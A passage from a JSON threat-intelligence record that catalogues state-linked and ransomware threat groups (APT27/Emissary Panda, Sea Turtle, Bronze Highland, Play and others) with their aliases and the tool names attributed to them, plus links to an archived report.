            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2c980ea7-04c4-4193-8535-52f87e66a96e",
            "created_at": "2024-05-01T02:03:07.994126Z",
            "updated_at": "2025-03-27T02:05:17.293799Z",
            "deleted_at": null,
            "main_name": "BRONZE UNION",
            "aliases": [
                "Budworm ",
                "Emissary Panda ",
                "Iron Tiger ",
                "Lucky Mouse ",
                "TG-3390 ",
                "Temp.Hippo ",
                "APT27 "
            ],
            "source_name": "Secureworks:BRONZE UNION",
            "tools": [
                " ASPXSpy",
                " China Chopper",
                " Enfal",
                " Gh0st RAT",
                " HttpBrowser",
                " Hunter",
                " HyperBro",
                " OwaAuth",
                " PlugX",
                " PoisonIvy",
                " Sysupdate",
                " ZxShell",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "33ae2a40-02cd-4dba-8461-d0a50e75578b",
            "created_at": "2023-01-06T13:46:38.947314Z",
            "updated_at": "2025-03-27T02:00:02.959421Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "SILICON",
                "Teal Kurma",
                "UNC1326",
                "COSMIC WOLF",
                "Marbled Dust"
            ],
            "source_name": "MISPGALAXY:Sea Turtle",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c63ab035-f9f2-4723-959b-97a7b98b5942",
            "created_at": "2023-01-06T13:46:38.298354Z",
            "updated_at": "2025-03-27T02:00:02.798255Z",
            "deleted_at": null,
            "main_name": "APT27",
            "aliases": [
                "TG-3390",
                "EMISSARY PANDA",
                "TEMP.Hippo",
                "Budworm",
                "Group 35",
                "BRONZE UNION",
                "Lucky Mouse",
                "Iron Taurus",
                "GreedyTaotie",
                "Red Phoenix",
                "ZipToken",
                "Iron Tiger",
                "G0027",
                "Earth Smilodon"
            ],
            "source_name": "MISPGALAXY:APT27",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "19ac84cc-bb2d-4e0c-ace0-5a7659d89ac7",
            "created_at": "2022-10-25T16:07:23.422755Z",
            "updated_at": "2025-03-27T02:02:09.791931Z",
            "deleted_at": null,
            "main_name": "Bronze Highland",
            "aliases": [
                "Daggerfly",
                "Evasive Panda",
                "Storm Cloud",
                "StormBamboo",
                "TAG-102",
                "TAG-112"
            ],
            "source_name": "ETDA:Bronze Highland",
            "tools": [
                "Agentemis",
                "CDDS",
                "CloudScout",
                "Cobalt Strike",
                "CobaltStrike",
                "DazzleSpy",
                "KsRemote",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "MacMa",
                "Macma",
                "MgBot",
                "Mgmbot",
                "NetMM",
                "Nightdoor",
                "POCOSTICK",
                "RELOADEXT",
                "Suzafk",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5c13338b-eaed-429a-9437-f5015aa98276",
            "created_at": "2022-10-25T16:07:23.582715Z",
            "updated_at": "2025-03-27T02:02:09.875151Z",
            "deleted_at": null,
            "main_name": "Emissary Panda",
            "aliases": [
                "APT 27",
                "ATK 15",
                "Bronze Union",
                "Budworm",
                "Earth Smilodon",
                "Emissary Panda",
                "Group 35",
                "Iron Taurus",
                "Iron Tiger",
                "LuckyMouse",
                "Operation DRBControl",
                "Operation Iron Tiger",
                "Operation PZChao",
                "Operation SpoiledLegacy",
                "Operation StealthyTrident",
                "Red Phoenix",
                "TEMP.Hippo",
                "TG-3390",
                "ZipToken"
            ],
            "source_name": "ETDA:Emissary Panda",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Agent.dhwf",
                "AngryRebel",
                "Antak",
                "CHINACHOPPER",
                "China Chopper",
                "Destroy RAT",
                "DestroyRAT",
                "FOCUSFJORD",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HTTPBrowser",
                "HTran",
                "HUC Packet Transmit Tool",
                "HighShell",
                "HttpBrowser RAT",
                "HttpDump",
                "HyperBro",
                "HyperSSL",
                "HyperShell",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "Moudour",
                "Mydoor",
                "Nishang",
                "OwaAuth",
                "PCRat",
                "PlugX",
                "ProcDump",
                "PsExec",
                "RedDelta",
                "SEASHARPEE",
                "Sensocode",
                "SinoChopper",
                "Sogu",
                "SysUpdate",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Token Control",
                "TokenControl",
                "TwoFace",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Xamtrav",
                "ZXShell",
                "gsecdump",
                "luckyowa"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2664d6f5-f918-4978-87f8-f6afad7402c6",
            "created_at": "2023-01-06T13:46:39.393669Z",
            "updated_at": "2025-03-27T02:00:03.073942Z",
            "deleted_at": null,
            "main_name": "Earth Berberoka",
            "aliases": [
                "GamblingPuppet"
            ],
            "source_name": "MISPGALAXY:Earth Berberoka",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1680660517,
    "ts_updated_at": 1743041821,
    "ts_creation_date": 1680510819,
    "ts_modification_date": 1680510819,
    "files": {
        "pdf": "https://archive.orkl.eu/8f02e50e937228476c2898f3f02dd74fd6a43340.pdf",
        "text": "https://archive.orkl.eu/8f02e50e937228476c2898f3f02dd74fd6a43340.txt",
        "img": "https://archive.orkl.eu/8f02e50e937228476c2898f3f02dd74fd6a43340.jpg"
    }
}